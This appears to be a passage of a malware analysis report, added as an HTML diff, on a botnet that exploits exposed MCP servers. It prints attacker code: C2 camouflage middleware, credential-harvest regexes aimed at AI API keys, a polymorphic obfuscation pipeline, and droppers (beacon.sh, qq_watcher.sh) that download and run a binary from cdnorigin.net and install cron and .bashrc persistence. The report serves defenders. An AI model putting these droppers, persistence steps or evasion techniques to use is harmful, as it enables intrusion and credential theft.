+    <span class="kw">if</span> <span class="fn">verify_bot_auth</span>(req):
+        <span class="kw">return await</span> <span class="fn">call_next</span>(req)
+    <span class="kw">return</span> <span class="fn">JSONResponse</span>({<span class="st">"error"</span>: <span class="st">"unauthorized"</span>}, status_code=<span class="blu">401</span>)</code></pre>
+
+<h3>Backward-Compatible Bootstrap</h3>
+
+<p>
+  The <code>OPEN_ENDPOINTS</code> set includes <code>/api/client/update</code> and
+  <code>/api/agent/download</code>. Old bots running v3.1 - without any HMAC capability
+  - can still reach these endpoints without authentication and download the v4.0 binary
+  with HMAC baked in. The update system bootstraps the entire fleet to authenticated
+  operation without losing a single node.
+</p>
+
+<div class="callout-orange">
+  <p>
+    The v3.1 to v4.0 upgrade is not a routine patch. It is a direct operational response
+    to having their entire credential database exposed. The <code>OPEN_ENDPOINTS</code>
+    list was carefully designed to maintain continuity - the update channel stays open --
+    while locking down everything sensitive. The operators understood exactly which
+    endpoints had caused the exposure and addressed each one.
+  </p>
+</div>
+
+
+<h3>CDN Camouflage</h3>
+
+<p>
+  Controller v4.0 adds a middleware layer that redirects all non-API traffic to a
+  legitimate CDN company. The intent is to make the C2 server appear to be a CDN origin
+  when visited by browsers, crawlers, or security researchers.
+</p>
+
+<pre><code><span class="cm"># controller_v4.py - lines 235-247</span>
+<span class="cm"># ===== CDN CAMOUFLAGE =====</span>
+<span class="cm"># Non-API traffic (browser visits, crawlers) gets redirected to a real CDN company.</span>
+<span class="cm"># Makes the domain look like a boring CDN origin server, not a C2 controller.</span>
+<span class="hl">@app.middleware(<span class="st">"http"</span>)</span>
+<span class="kw">async def</span> <span class="fn">camouflage_middleware</span>(req: Request, call_next):
+    path = req.url.path
+    <span class="kw">if</span> path.<span class="fn">startswith</span>(<span class="st">"/api/"</span>):
+        <span class="kw">return await</span> <span class="fn">call_next</span>(req)
+    <span class="kw">if</span> path == <span class="st">"/robots.txt"</span>:
+        <span class="kw">return</span> <span class="fn">PlainTextResponse</span>(
+            <span class="st">"User-agent: *\nDisallow: /\n"</span>, media_type=<span class="st">"text/plain"</span>
+        )
+    <span class="cm"># Everything else - redirect to real CDN company</span>
+    <span class="kw">return</span> <span class="fn">RedirectResponse</span>(<span class="st">"https://www.imperva.com/"</span>, status_code=<span class="blu">302</span>)</code></pre>
+
+<p>
+  The layered effect is as follows: a browser or automated scanner visiting the IP receives
+  a 302 redirect to Imperva's homepage, making the server appear to be a CDN origin.
+  The <code>robots.txt</code> response ("Disallow: /") is consistent with what a CDN
+  origin would return to prevent search engines from indexing it. API paths bypass the
+  redirect entirely, requiring an attacker to know the <code>/api/</code> prefix.
+</p>
+
+<p>
+  Combined with the Cloudflare tunnel relay - where agents connect via Cloudflare-issued
+  URLs rather than the raw C2 IP - the infrastructure presents a minimal footprint on
+  threat intelligence feeds. Network-layer defenders inspecting agent traffic see only
+  Cloudflare IP ranges; defenders probing the C2 IP directly see only a CDN 302 redirect.
+</p>
+
+<p>
+  The <code>cdnorigin.net</code> domain compounds this effect. When TLS traffic to port 443
+  is inspected at the SNI layer, the server name <code>cdnorigin.net</code> reads as a
+  plausible CDN origin hostname. The domain name was chosen to blend into traffic analysis
+  tooling that correlates SNI values against known CDN provider domains.
+</p>
+
+
+<!-- Section 9: Chain Engine -->
+<h2 id="chain-engine">08. Attack Chain Engine</h2>
+
+<p>
+  Controller v4.0 introduces a capability that v3.1 entirely lacked: automated multi-step
+  attack sequencing. The <code>pathing_engine.py</code> script - present in the open
+  directory - analyzes the results database and generates "chains": ordered sequences of
+  exploitation steps that agents execute one at a time.
+</p>
+
+<h3>Chain Dispatch - Security-Aware Design</h3>
+
+<pre><code><span class="cm"># controller_v4.py - chain_row dispatch section</span>
+<span class="cm"># SECURITY: Only send ONE step at a time to bot - never reveal full chain</span>
+<span class="cm"># SECURITY: Only trusted bots (active >1h, >10 tasks) get chain tasks</span>
+bot_task_count = cur.<span class="fn">fetchone</span>()[<span class="blu">0</span>]
+bot_age = time.<span class="fn">time</span>() - (node_row[<span class="blu">0</span>] <span class="kw">or</span> time.<span class="fn">time</span>())
+is_trusted = bot_task_count >= <span class="blu">10</span> <span class="kw">and</span> bot_age > <span class="blu">3600</span>
+
+<span class="cm"># ... (assign chain_task to trusted bot)</span>
+
+<span class="kw">if</span> chain_row:
+    chain_id, chain_data, step_idx = chain_row
+    steps = chain_data.<span class="fn">get</span>(<span class="st">"steps"</span>, [])
+    step = steps[step_idx]
+    <span class="fn">print</span>(
+        <span class="fn">f</span><span class="st">"[AUDIT] chain_step_dispatch id={chain_id} "</span>
+        <span class="fn">f</span><span class="st">"step={step_idx}/{len(steps)} bot={nid} "</span>
+        <span class="fn">f</span><span class="st">"exploit={step.get('exploit','?')} "</span>
+        <span class="fn">f</span><span class="st">"target={step.get('target','?')}"</span>,
+        flush=<span class="blu">True</span>
+    )
+    <span class="kw">return</span> {
+        <span class="st">"task_id"</span>: ...,
+        <span class="st">"chain_task"</span>: {
+            <span class="st">"id"</span>: chain_id,
+            <span class="st">"step"</span>: step_idx,
+            <span class="st">"total_steps"</span>: <span class="fn">len</span>(steps),
+            <span class="st">"exploit"</span>: step.<span class="fn">get</span>(<span class="st">"exploit"</span>),
+            <span class="st">"target"</span>: step.<span class="fn">get</span>(<span class="st">"target"</span>),
+            <span class="st">"deploy_cmd"</span>: step.<span class="fn">get</span>(<span class="st">"deploy_cmd"</span>)
+        }
+    }</code></pre>
+
+<h3>Chain Refresh Endpoint</h3>
+
+<pre><code><span class="hl">@app.post(<span class="st">"/api/chains/refresh"</span>)</span>
+<span class="kw">async def</span> <span class="fn">refresh_chains</span>():
+    <span class="st">"""Re-run the pathing engine with latest findings and populate chain_tasks."""</span>
+    result = subprocess.<span class="fn">run</span>(
+        [<span class="st">".venv/bin/python"</span>, <span class="st">"pathing_engine.py"</span>, <span class="st">"--db"</span>, <span class="st">"--json"</span>],
+        capture_output=<span class="blu">True</span>, text=<span class="blu">True</span>, timeout=<span class="blu">120</span>, cwd=<span class="st">"/opt/scanner"</span>
+    )
+    tasks = json.<span class="fn">loads</span>(result.stdout.<span class="fn">strip</span>().<span class="fn">split</span>(<span class="st">"\n"</span>)[<span class="blu">-1</span>])
+    <span class="kw">for</span> task <span class="kw">in</span> tasks:
+        chain_sig = json.<span class="fn">dumps</span>(task.<span class="fn">get</span>(<span class="st">"steps"</span>, []), sort_keys=<span class="blu">True</span>)
+        cur.<span class="fn">execute</span>(
+            <span class="st">"INSERT INTO chain_tasks (chain, status, created_at) "</span>
+            <span class="st">"VALUES (%s, 'pending', %s)"</span>,
+            (json.<span class="fn">dumps</span>(task), time.<span class="fn">time</span>())
+        )</code></pre>
+
+<h3>Chain Trust and Safety Mechanics</h3>
+
+<ul>
+  <li>Each bot receives exactly one step at a time. The full chain is never sent to any single agent.</li>
+  <li>A bot must complete at least 10 scan tasks AND maintain connectivity for 1+ hour before receiving chain assignments.</li>
+  <li>Targets that fail 3 or more consecutive steps are automatically blacklisted from that chain.</li>
+  <li>Step results are submitted via <code>POST /api/chains/result/{nid}</code>; the controller advances the chain or marks it failed.</li>
+  <li>Full audit logging on every chain step dispatch: chain ID, step index, exploit type, and target IP are written to the controller log.</li>
+</ul>
+
+<div class="callout-blue">
+  <p>
+    The presence of <code>pathing_engine.py</code> marks a significant capability
+    escalation. This operation moved from "opportunistic MCP scanning" to "automated
+    multi-step lateral movement planning." The chain engine generates sequences like:
+    scan - find exposed tool - execute command - harvest credentials - deploy agent
+    - scan adjacent networks. Each compromised host becomes a planned stepping stone,
+    not just an incidental victim.
+  </p>
+</div>
+
+<div class="fig-wrap">
+  <img src="img_chain_engine.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="Attack chain engine architecture">
+  <p class="fig-cap">Fig. 7 - The v4.0 attack chain engine: <code>pathing_engine.py</code> reads the results database, builds multi-step exploitation chains, and dispatches one step at a time to trusted bots. No single agent ever sees the full plan.</p>
+</div>
+
+<h3>Exploit Template Registry (16 Documented Templates)</h3>
+
+<p>
+  <code>pathing_engine.py</code> ships with multiple pre-built exploit templates organized
+  into four categories. Each template declares the capability it requires, the capability
+  it provides, reliability metadata, and a <code>deploy_cmd</code> identifier
+  that the agent translates into actual shellcode.
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Category</th><th>Template</th><th>Requires</th><th>Provides</th><th>Reliability</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td rowspan="5"><span class="pill p-red">MCP Protocol Exploitation</span></td>
+      <td class="mono">dbhub_unauth_sql</td>
+      <td>network_access</td>
+      <td>sql_read + sql_write</td>
+      <td>0.70</td>
+    </tr>
+    <tr>
+      <td class="mono">mysql_streamable_unauth</td>
+      <td>network_access</td>
+      <td>sql_read + sql_write</td>
+      <td>0.65</td>
+    </tr>
+    <tr>
+      <td class="mono">aks_mcp_unauth</td>
+      <td>network_access</td>
+      <td>k8s_admin</td>
+      <td>0.60</td>
+    </tr>
+    <tr>
+      <td class="mono">mcp_shell_exec</td>
+      <td>network_access</td>
+      <td>shell_exec</td>
+      <td>0.80</td>
+    </tr>
+    <tr>
+      <td class="mono">mcp_file_read</td>
+      <td>network_access</td>
+      <td>file_read</td>
+      <td>0.85</td>
+    </tr>
+    <tr>
+      <td rowspan="4"><span class="pill p-orange">SQL - RCE</span></td>
+      <td class="mono">sql_to_pg_rce</td>
+      <td>sql_write (pg)</td>
+      <td>shell_exec via <code>pg_copy_to_program</code></td>
+      <td>0.60</td>
+    </tr>
+    <tr>
+      <td class="mono">sql_to_mysql_rce</td>
+      <td>sql_write (mysql)</td>
+      <td>shell_exec via <code>outfile + cron</code></td>
+      <td>0.40</td>
+    </tr>
+    <tr>
+      <td class="mono">creds_to_redis / redis_cron_rce</td>
+      <td>creds:redis / redis_access</td>
+      <td>redis_access / shell_exec</td>
+      <td>0.80 / 0.50</td>
+    </tr>
+    <tr>
+      <td class="mono">creds_to_ssh</td>
+      <td>creds:ssh</td>
+      <td>shell_exec</td>
+      <td>0.70</td>
+    </tr>
+    <tr>
+      <td rowspan="4"><span class="pill p-yellow">CVE</span></td>
+      <td class="mono">jenkins_cli_rce</td>
+      <td>network_access (port 8080)</td>
+      <td>shell_exec</td>
+      <td>0.65</td>
+    </tr>
+    <tr>
+      <td class="mono">docker_api_rce</td>
+      <td>network_access (port 2375/2376)</td>
+      <td>shell_exec</td>
+      <td>0.85</td>
+    </tr>
+    <tr>
+      <td class="mono">rclone_rcd_rce</td>
+      <td>network_access (port 5572)</td>
+      <td>shell_exec</td>
+      <td>0.70</td>
+    </tr>
+    <tr>
+      <td class="mono">weblogic_console_rce</td>
+      <td>network_access (port 7001)</td>
+      <td>shell_exec</td>
+      <td>0.55</td>
+    </tr>
+    <tr>
+      <td rowspan="3"><span class="pill p-purple">Lateral</span></td>
+      <td class="mono">shell_to_container_escape</td>
+      <td>shell_exec</td>
+      <td>shell_exec (host)</td>
+      <td>0.50</td>
+    </tr>
+    <tr>
+      <td class="mono">k8s_to_pod_exec</td>
+      <td>k8s_admin</td>
+      <td>shell_exec</td>
+      <td>0.60</td>
+    </tr>
+    <tr>
+      <td class="mono">creds_to_azure</td>
+      <td>creds:azure</td>
+      <td>cloud_access (azure)</td>
+      <td>0.65</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<h3>Chain Scoring Formula</h3>
+
+<p>
+  Attack chains are ranked by a composite score that weighs severity, end-state value,
+  reliability across all steps, and path length. Shorter paths to high-value end states
+  are preferred:
+</p>
+
+<pre><code><span class="cm"># pathing_engine.py - AttackChain.score property</span>
+score = (max_severity + end_bonus) * reliability * <span class="blu">0.85</span> ** depth
+
+<span class="cm"># end_bonus values (capability type → bonus points):</span>
+<span class="cm"># shell_exec  → +5    (arbitrary code execution confirmed)</span>
+<span class="cm"># k8s_admin   → +5    (full Kubernetes cluster control)</span>
+<span class="cm"># cloud_access → +8   (highest bonus: cloud account takeover)</span>
+<span class="cm"># creds        → +2   (credential harvest, enables further chaining)</span>
+
+<span class="cm"># reliability = product of all step reliabilities in the chain</span>
+<span class="cm"># depth penalty: 0.85^depth = 0.72 at 2 steps, 0.61 at 3 steps, 0.52 at 4 steps</span></code></pre>
+
+<p>
+  The depth penalty (0.85 per step) means a two-step chain scoring 7.0 outranks a
+  three-step chain scoring 8.5 in raw capability terms if the three-step path's
+  reliability product drops enough. This drives the engine toward direct, high-confidence
+  routes rather than elaborate chains with multiple low-reliability steps.
+</p>
+
+<h3>Credential Harvest Rules - AI API Keys Explicitly Targeted</h3>
+
+<p>
+  Harvest rules in <code>pathing_engine.py</code> extract credentials from exploit output. The following example shows AI API key prioritization:
+</p>
+
+<pre><code><span class="cm"># pathing_engine.py - build_harvest_rules()</span>
+rules[<span class="st">"env_vars"</span>] = HarvestRule(
+    trigger_type=<span class="st">"shell_exec"</span>,
+    patterns=[
+        <span class="st">r'(?:OPENAI_API_KEY|ANTHROPIC_API_KEY|AWS_ACCESS_KEY_ID|'</span>
+        <span class="st">r'AWS_SECRET_ACCESS_KEY|GOOGLE_API_KEY|STRIPE_API_KEY)\s*=\s*([^\s]+)'</span>,
+        <span class="st">r'(?:DATABASE_URL|REDIS_URL)\s*=\s*([^\s]+)'</span>,
+    ],
+    produces={<span class="st">"type"</span>: <span class="st">"creds"</span>, <span class="st">"target"</span>: <span class="st">"api:{extracted}"</span>},
+)
+
+rules[<span class="st">"env_file"</span>] = HarvestRule(  <span class="cm"># fires on file_read (e.g. .env files)</span>
+    trigger_type=<span class="st">"file_read"</span>,
+    patterns=[  <span class="cm"># same patterns + mongodb + password fallback</span>
+        <span class="st">r'(?:OPENAI_API_KEY|ANTHROPIC_API_KEY|AWS_ACCESS_KEY_ID|...)\s*=\s*([^\s]+)'</span>,
+    ],
+    produces={<span class="st">"type"</span>: <span class="st">"creds"</span>, <span class="st">"target"</span>: <span class="st">"api:{extracted}"</span>},
+)
+
+<span class="cm"># Additional rules harvest:</span>
+<span class="cm">#   sql_config_table → MySQL/JDBC connection strings from config tables</span>
+<span class="cm">#   sql_user_hashes  → bcrypt, MD5, SHA1 password hashes from sql_read output</span>
+<span class="cm">#   k8s_secrets      → DATADOG_API_KEY, AZURE_CLIENT_SECRET from Kubernetes secrets</span>
+<span class="cm">#   ssh_keys         → PEM private key blocks from file_read output</span>
+<span class="cm">#   nginx_ui_*       → nginx-ui node secrets for authenticated PTY access</span></code></pre>
+
+<div class="callout-red">
+  <p>
+    AI API key harvesting is a first-class objective, not an afterthought. MCP servers -
+    the primary scan target - are overwhelmingly deployed by AI application developers who
+    routinely set <code>OPENAI_API_KEY</code> and <code>ANTHROPIC_API_KEY</code> in their
+    environment. A single shell_exec on an MCP host yields these keys automatically,
+    without any additional attacker action.
+  </p>
+</div>
+
+
+<!-- Section 10: Polymorphic -->
+<h2 id="polymorphic">09. Polymorphic Agent Build Pipeline</h2>
+
+<p>
+  <code>build_agent.py</code> takes the canonical agent source (<code>mesh_agent.py</code>)
+  and transforms it through 8 AST and bytecode stages, producing a unique binary on every
+  build. Two downloads of the agent at the same second will produce binaries with different
+  file hashes, different identifier names, different string encodings, different function
+  ordering, and different blob compression. File hash and static YARA string-matching
+  are both defeated without behavioral rules.
+</p>
+
+<h3>Eight Build Stages</h3>
+
+<div class="stage-list">
+  <div class="stage-item">
+    <div class="stage-num">1</div>
+    <div>
+      <div class="stage-name">Dead Code Removal</div>
+      <div class="stage-desc">AST traversal strips all docstrings, comments, and <code>print()</code> calls to reduce the surface area available to pattern-matching before obfuscation begins.</div>
+    </div>
+  </div>
+  <div class="stage-item">
+    <div class="stage-num">2</div>
+    <div>
+      <div class="stage-name">Identifier Renaming</div>
+      <div class="stage-desc">Approximately 40 sensitive identifiers - <code>MESH_KEY</code>, <code>AGENT_VERSION</code>, <code>CONTROLLER</code>, <code>AUTH_PUB_HEX</code>, <code>CACHED_CIDRS</code>, <code>scan_cidr</code>, <code>verify_signature</code>, <code>PeerHandler</code>, and others - are replaced with randomly generated 8-character opaque strings. New names are generated per build from a fresh random seed.</div>
+    </div>
+  </div>
+  <div class="stage-item">
+    <div class="stage-num">3</div>
+    <div>
+      <div class="stage-name">XOR String Encoding</div>
+      <div class="stage-desc">A tokenizer pass identifies string literals matching 22 sensitive patterns: IP addresses, CIDR notation, path prefixes like <code>/dev/shm/</code>, protocol keywords like <code>n4d</code>, and API paths. Each matching constant is XOR-encoded with a per-build random 16-byte key and replaced with an inline decoder expression.</div>
+    </div>
+  </div>
+  <div class="stage-item">
+    <div class="stage-num">4</div>
+    <div>
+      <div class="stage-name">Function Order Shuffle</div>
+      <div class="stage-desc">Top-level function definitions are extracted from the AST and reinserted in cryptographically random order. Runtime semantics are preserved because Python resolves function names at call time, not definition time.</div>
+    </div>
+  </div>
+  <div class="stage-item">
+    <div class="stage-num">5</div>
+    <div>
+      <div class="stage-name">No-Op Code Injection</div>
+      <div class="stage-desc">Decoy statements (<code>_=0</code>, <code>if 0:pass</code>, <code>_=len("")</code>) are injected at roughly 1.5% probability per eligible line boundary. These contribute to hash uniqueness and slightly inflate disassembly length.</div>
+    </div>
+  </div>
+  <div class="stage-item">
+    <div class="stage-num">6</div>
+    <div>
+      <div class="stage-name">Compile Verification</div>
+      <div class="stage-desc">The transformed source is passed through Python's <code>compile()</code> to catch any syntax errors introduced by the transformation stages before committing to the next stage.</div>
+    </div>
+  </div>
+  <div class="stage-item">
+    <div class="stage-num">7</div>
+    <div>
+      <div class="stage-name">Compress and Blob Encode</div>
+      <div class="stage-desc">Random compression algorithm (zlib level 9, bz2 level 9, or no compression), followed by a randomly chosen XOR variant: plain XOR, XOR then byte rotation, or XOR of the reversed byte sequence. Both choices are baked into the output loader.</div>
+    </div>
+  </div>
+  <div class="stage-item">
+    <div class="stage-num">8</div>
+    <div>
+      <div class="stage-name">Randomized Loader Stub</div>
+      <div class="stage-desc">A minimal Python loader with randomized variable names decodes the blob and <code>exec()</code>s it at runtime. Three anti-analysis features execute in randomized order: self-deletion (<code>os.unlink(sys.argv[0])</code>), anti-debug (reads <code>/proc/self/status</code>, exits if <code>TracerPid != 0</code>), and output suppression (<code>sys.stdout = open("/dev/null","w")</code>).</div>
+    </div>
+  </div>
+</div>
+
+<h3>XOR Encoding - Runtime Decoder Generation</h3>
+
+<pre><code><span class="cm"># build_agent.py - per-build XOR encoding (abbreviated)</span>
+XOR_KEY = os.<span class="fn">urandom</span>(<span class="blu">16</span>)  <span class="cm"># 16 random bytes per build</span>
+
+<span class="kw">def</span> <span class="fn">xor_encode</span>(data: bytes) -> bytes:
+    key = XOR_KEY
+    <span class="kw">return</span> <span class="fn">bytes</span>(b ^ key[i % <span class="fn">len</span>(key)] <span class="kw">for</span> i, b <span class="kw">in</span> <span class="fn">enumerate</span>(data))
+
+<span class="cm"># String encoding in AST transformer</span>
+<span class="kw">def</span> <span class="fn">encode_string</span>(s: str) -> ast.expr:
+    raw = s.<span class="fn">encode</span>()
+    enc = <span class="fn">xor_encode</span>(raw)
+    <span class="cm"># Generate: bytes([...]).decode() using XOR at runtime</span>
+    <span class="kw">return</span> ast.<span class="fn">parse</span>(
+        <span class="fn">f</span><span class="st">"bytes(b ^ {XOR_KEY}[i % {len(XOR_KEY)}] "</span>
+        <span class="fn">f</span><span class="st">"for i, b in enumerate({list(enc)})).decode()"</span>,
+        mode=<span class="st">'eval'</span>
+    ).body</code></pre>
+
+<div class="callout-orange">
+  <p>
+    Every call to <code>GET /api/agent/download</code> triggers a fresh build. Two
+    downloads of the agent at the same second produce binaries with different hashes,
+    different identifier names, different string encodings, and different function orders.
+    File hash and YARA string-matching are both ineffective against this pipeline without
+    behavioral detection rules targeting the anti-analysis patterns at runtime.
+  </p>
+</div>
+
+<div class="fig-wrap">
+  <img src="img_polymorphic.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="Polymorphic build pipeline diagram">
+  <p class="fig-cap">Fig. 8 - The eight-stage polymorphic build pipeline: each output binary has a unique hash, unique identifier names, unique string encoding, and unique function order.</p>
+</div>
+
+
+<!-- Section 11: AWS -->
+<h2 id="aws">10. AWS Post-Exploitation</h2>
+
+<p>
+  Once credentials appear in the intel database, <code>aws_enum.py</code> processes them
+  to enumerate the AWS attack surface of each compromised account. Six credential pairs
+  from three distinct AWS accounts appear in <code>aws_validated.json</code> - all
+  values <strong>[REDACTED]</strong>. IAM usernames identified: <code>admin-old</code>,
+  <code>svc-backup</code>, <code>svc-ansible</code>, <code>payroll-svc</code>,
+  <code>legacy-service</code>.
+</p>
+
+<h3>Privilege Escalation Probe</h3>
+
+<p>
+  The script includes a specific test for <code>iam:CreateAccessKey</code> permission,
+  which would allow creating new long-term credentials independent of the original
+  compromised key:
+</p>
+
+<pre><code><span class="cm"># aws_enum.py - privilege escalation test (abbreviated)</span>
+new_keys = iam.<span class="fn">create_access_key</span>(UserName=user)
+<span class="kw">if</span> new_keys:
+    <span class="fn">print</span>(<span class="st">"*** CAN CREATE NEW ACCESS KEYS (persistent access) ***"</span>)
+    <span class="cm"># Creates then immediately deletes - tests the permission without leaving an artifact</span>
+    iam.<span class="fn">delete_access_key</span>(
+        UserName=user,
+        AccessKeyId=new_keys[<span class="st">'AccessKey'</span>][<span class="st">'AccessKeyId'</span>]
+    )</code></pre>
+
+<p>
+  Creating and immediately deleting a key tests the permission without leaving a
+  persistent artifact in the IAM console's access key list.
+</p>
+
+<h3>Enumeration Scope</h3>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>AWS Service</th><th>Data Collected</th><th>Risk</th></tr>
+  </thead>
+  <tbody>
+    <tr><td class="strong">IAM</td><td>Users, groups, attached policies, policy documents; wildcard (<code>Action: "*"</code>) policy detection</td><td><span class="pill p-red">CreateAccessKey escalation probe</span></td></tr>
+    <tr><td class="strong">S3</td><td>All bucket names; object listing in deep mode</td><td><span class="pill p-orange">Data exfiltration</span></td></tr>
+    <tr><td class="strong">EC2</td><td>All instances across 12 regions: us-east-1/2, us-west-1/2, eu-west-1/2, eu-central-1, ap-south-1, ap-northeast-1, ap-southeast-1, ca-central-1, sa-east-1</td><td><span class="pill p-orange">Lateral movement</span></td></tr>
+    <tr><td class="strong">Secrets Manager</td><td>Secret names and descriptions</td><td><span class="pill p-red">Keys, tokens, passwords</span></td></tr>
+    <tr><td class="strong">SSM Parameter Store</td><td>Parameter names, managed instance list</td><td><span class="pill p-orange">Remote execution</span></td></tr>
+    <tr><td class="strong">RDS</td><td>Database endpoints and engine types</td><td><span class="pill p-blue">Reconnaissance</span></td></tr>
+    <tr><td class="strong">Lambda</td><td>Function names and runtimes</td><td><span class="pill p-blue">Reconnaissance</span></td></tr>
+  </tbody>
+</table>
+</div>
+
+
+<!-- Section 12: Beacon -->
+<h2 id="beacon">11. Dropper & Confirmed Compromise</h2>
+
+<p>
+  The dropper infrastructure consists of three interrelated shell scripts. <code>beacon.sh</code>
+  is the primary implant delivery mechanism deployed on newly compromised hosts. It downloads
+  the Go agent binary, establishes two persistence mechanisms, and loops indefinitely. Separate
+  scripts target specific victim categories: <code>qq_watcher.sh</code> monitors and auto-exploits
+  QQ Message Bot MCP services. <code>mesh_minimal.py</code> serves as a Python-to-Go bridge for
+  environments where direct Go binary execution is constrained.
+</p>
+
+<h3>beacon.sh - 8-Method Download Chain</h3>
+
+<p>
+  The dropper attempts to download the Go agent from three URLs using eight successive
+  download methods, in order from most preferred to least. Only on total failure does it
+  exit. A size check (<code>&gt; 3MB</code>) validates that a real binary was received,
+  not a redirect page or error response:
+</p>
+
+<pre><code><span class="cm">#!/bin/bash</span>
+<span class="cm"># Primary URLs (in priority order)</span>
+H=<span class="st">"https://cdnorigin.net"</span>          <span class="cm"># TLS front on :443 (cdnorigin.net cert)</span>
+D=<span class="st">"http://[REDACTED]:8443"</span>          <span class="cm"># Direct C2 on :8443 (fallback)</span>
+P=<span class="st">"/api/agent/binary?arch=$B"</span>       <span class="cm"># $B = uname -m output</span>
+
+<span class="cm"># Method 1 (preferred): curl with TLS</span>
+curl -fsSL -o <span class="st">"$TF"</span> <span class="st">"$H$P"</span>
+
+<span class="cm"># Method 2: curl --insecure (skip cert validation)</span>
+curl -fsSLk -o <span class="st">"$TF"</span> <span class="st">"$H$P"</span>
+
+<span class="cm"># Method 3-4: wget variants</span>
+wget -qO <span class="st">"$TF"</span> <span class="st">"$H$P"</span>
+wget -qO <span class="st">"$TF"</span> --no-check-certificate <span class="st">"$H$P"</span>
+
+<span class="cm"># Method 5-6: Python fallbacks (py3/py2)</span>
+python3 -c <span class="st">"import urllib.request; urllib.request.urlretrieve('$H$P','$TF')"</span>
+python2 -c <span class="st">"import urllib; urllib.urlretrieve('$H$P','$TF')"</span>
+
+<span class="cm"># Method 7: Perl</span>
+perl -e <span class="st">"use LWP::Simple; getstore('$H$P','$TF')"</span>
+
+<span class="cm"># Method 8 (last resort): BusyBox wget (embedded Linux / IoT)</span>
+busybox wget -O <span class="st">"$TF"</span> <span class="st">"$D$P"</span>
+
+<span class="cm"># Size validation - reject anything smaller than 3 MB</span>
+<span class="kw">if</span> [ $(stat -c%s <span class="st">"$TF"</span>) -gt 3000000 ]; <span class="kw">then</span>
+  chmod +x <span class="st">"$TF"</span> &amp;&amp; <span class="st">"$TF"</span> &amp;
+<span class="kw">fi</span></code></pre>
+
+<p>
+  The <code>cdnorigin.net</code> HTTPS URL is always tried first. This ensures that
+  in environments performing SSL inspection, the server name (rather than a raw IP)
+  is what appears in inspection logs. Only if HTTPS fails completely does the dropper
+  fall back to the plain-HTTP direct C2 connection.
+</p>
+
+<h3>Dual Persistence Mechanism</h3>
+
+<p>
+  After first successful execution, <code>beacon.sh</code> installs two independent
+  persistence mechanisms to survive reboots and user session restarts:
+</p>
+
+<pre><code><span class="cm"># Persistence 1: System cron (requires root)</span>
+<span class="cm"># Hidden dot-prefixed filename in /etc/cron.d/ avoids cursory inspection</span>
+<span class="kw">echo</span> <span class="st">"*/2 * * * * root $CMD"</span> &gt; /etc/cron.d/.sys-health
+<span class="cm"># Runs every 2 minutes as root; re-downloads and re-executes the agent</span>
+
+<span class="cm"># Persistence 2: Root .bashrc append</span>
+<span class="cm"># Triggers on every interactive root login</span>
+<span class="kw">echo</span> <span class="st">"$CMD &amp;"</span> &gt;&gt; /root/.bashrc</code></pre>
+
+<div class="callout-red">
+  <p>
+    The 2-minute cron interval means an agent killed by a defender is re-launched
+    within 120 seconds from the same machine. Effective remediation requires both
+    removing <code>/etc/cron.d/.sys-health</code> AND cleaning the root <code>.bashrc</code>
+    entry, in addition to terminating the running agent process.
+  </p>
+</div>
+
+<h3>qq_watcher.sh - Confirmed RCE on QQ Bot MCP Server</h3>
+
+<p>
+  A separate dropper script targets QQ Message Bot MCP services - instances where the
+  QQ instant messaging platform's bot API is exposed via an MCP server. The script polls
+  an MCP endpoint every 5 minutes, initiates a session, then calls
+  <code>execute_shell_command</code> to download and execute the Go agent:
+</p>
+
+<pre><code><span class="cm">#!/bin/bash</span>
+<span class="cm"># Target: QQ Message Bot MCP service (MCP "QQ Message Bot MCP服务")</span>
+TARGET_URL=<span class="st">"http://[REDACTED]:5000/mcp"</span>
+
+<span class="kw">while</span> <span class="blu">true</span>; <span class="kw">do</span>
+  <span class="cm"># Step 1: MCP initialize - extract mcp-session-id from response headers</span>
+  SESSION=$(curl -s -D - -X POST <span class="st">"$TARGET_URL"</span> \
+    -d <span class="st">'{"jsonrpc":"2.0","method":"initialize","id":1,...}'</span> \
+    | grep -i <span class="st">"mcp-session-id"</span> | awk <span class="st">'{print $2}'</span>)
+
+  <span class="cm"># Step 2: tools/call execute_shell_command with agent download one-liner</span>
+  curl -s -X POST <span class="st">"$TARGET_URL"</span> \
+    -H <span class="st">"mcp-session-id: $SESSION"</span> \
+    -d <span class="st">'{"jsonrpc":"2.0","method":"tools/call","id":2,</span>
+         <span class="st">"params":{"name":"execute_shell_command",</span>
+         <span class="st">"arguments":{"command":"curl -fsSLk https://cdnorigin.net/api/agent/binary?arch=amd64 -o /tmp/.agent &amp;&amp; chmod +x /tmp/.agent &amp;&amp; /tmp/.agent &amp;"}}}'</span>
+
+  sleep 300   <span class="cm"># poll every 5 minutes</span>
+<span class="kw">done</span></code></pre>
+
+<div class="callout-red">
+  <p>
+    <strong>Confirmed RCE event.</strong> The watcher script's output logs contain a successful
+    execution timestamp: the agent binary was downloaded, made executable, and launched on the QQ bot
+    host at approximately 22:19 UTC on 2026-06-20. The target delivered an agent to a production
+    QQ messaging infrastructure server.
+  </p>
+</div>
+
+<h3>mesh_minimal.py - Python-to-Go Bridge</h3>
+
+<p>
+  In environments where the Go binary cannot be directly invoked (restrictive execution
+  policies, architecture mismatches, or constrained shells), a Python wrapper handles the
+  transition. <code>mesh_minimal.py</code> (identified as <code>v9.3-go-bridge</code>)
+  downloads the architecture-appropriate Go agent, launches it as a subprocess, then
+  self-terminates to leave no Python process in the process list:
+</p>
+
+<pre><code><span class="cm"># mesh_minimal.py v9.3-go-bridge (simplified)</span>
+<span class="kw">import</span> subprocess, tempfile, os, requests
+
+arch = subprocess.<span class="fn">check_output</span>([<span class="st">"uname"</span>, <span class="st">"-m"</span>]).strip().decode()
+agent_url = <span class="fn">f</span><span class="st">"https://cdnorigin.net/api/agent/binary?arch={arch}"</span>
+
+data = requests.<span class="fn">get</span>(agent_url, verify=<span class="blu">False</span>).content
+tf = tempfile.<span class="fn">mktemp</span>(prefix=<span class="st">"kworker"</span>)
+<span class="kw">with</span> <span class="fn">open</span>(tf, <span class="st">"wb"</span>) <span class="kw">as</span> f: f.<span class="fn">write</span>(data)
+os.<span class="fn">chmod</span>(tf, <span class="blu">0o755</span>)
